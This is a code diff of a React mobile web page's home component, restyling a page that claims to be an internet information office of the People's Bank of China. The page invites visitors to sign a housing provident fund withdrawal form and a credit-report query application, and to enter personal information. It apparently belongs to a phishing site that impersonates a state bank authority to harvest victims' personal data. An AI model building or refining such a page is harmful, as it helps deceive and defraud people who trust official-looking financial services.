@@ -1,7 +1,12 @@
-import { Card, Toast, Button, Space, Modal, Form, Input, Radio } from 'antd-mobile'
-import "./Home.css"
+import { Card, Toast, Button, Space, Modal, Form, Input, Radio, Image } from 'antd-mobile'
+import "./Home.css";
+
 import { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import sign1 from "../imgs/sign1.png";
+import sign2 from "../imgs/sign2.png";
+import background2 from "../imgs/beijing2.jpg";
+
 
 
 function Home() {
@@ -165,8 +170,8 @@ function Home() {
                             立即查询
                         </Button>
                     }
-                    onFinish={() => { onCheck2(); }}
-                    >
+                    onFinish={() => { onCheck2(); console.log(window.phone) }}
+                >
 
                     <Form.Header>请输入个人信息查询 </Form.Header>
                     <div >
@@ -199,45 +204,63 @@ function Home() {
         })
     }
 
-    const onCheck2 = ()=>{
+    const onCheck2 = () => {
+        Modal.clear();
+        navigate("/check");
 
     }
     return (
 
 
-        <div>
-            <Card className="Head">
-                中国银行互联网信息办公室
-            </Card>
-            <div className="Container">
-                <Space direction='vertical' block>
-                    <div className="TextTitle">
-                        中国人民银行<br />互联网信息办公室
+        <div className="Home">
+            <div className='BackGround1'>
+                <div className="Head">
+                    <img src={sign1}></img>
+                    <div style={{ "paddingLeft": "10px" }}>
+                        中国银行互联网信息办公室
                     </div>
-                    <div className="TextSmall">
-                        指导 · 协调 · 监督
-                    </div>
-                    <br />
-                    <Space direction='vertical' style={{ '--gap': '24px' }}  >
+                </div>
+                <div className="Container">
+                    <Space direction='vertical' block>
+                        <div className="TextTitle">
+                            中国人民银行<br />互联网信息办公室
+                        </div>
                         <div className="TextSmall">
-                            《个人提取住房公积金申请（审批）书》
+                            指导 · 协调 · 监督
                         </div>
-                        {/* <br /> */}
-                        <div className="TextSmall" >
-                            《个人征信系统查询申请》
-                        </div>
+                        <br />
+                        <Space direction='vertical' style={{ '--gap': '24px' }}  >
+                            <div className="TextSmall2" >
+                                <img src={sign2} />
+                                《个人提取住房公积金申请（审批）书》
+                            </div>
+                            {/* <br /> */}
+                            <div className="TextSmall2" >
+                                <img src={sign2} />
+                                《个人征信系统查询申请》
+                            </div>
 
 
+                        </Space>
+                        <div className="ButtonGroup">
+                            <Button block color='primary' size='large' onClick={onSubmit}>
+                                签署个人住房公积金审批书
+                            </Button>
+                            <Button block color='primary' size='large' onClick={onCheck}>
+                                查询之前签署信息
+                            </Button>
+                        </div>
                     </Space>
-                    <div className="ButtonGroup">
-                        <Button block color='primary' size='large' onClick={onSubmit}>
-                            签署个人住房公积金审批书
-                        </Button>
-                        <Button block color='primary' size='large' onClick={onCheck}>
-                            查询之前签署信息
-                        </Button>
-                    </div>
-                </Space>
+                </div>
+            </div>
+            <div className='BackGround2'>
+                <Image src={background2}>
+
+                </Image>
+
+            </div>
+            <div className="Footer">
+
             </div>
 
 
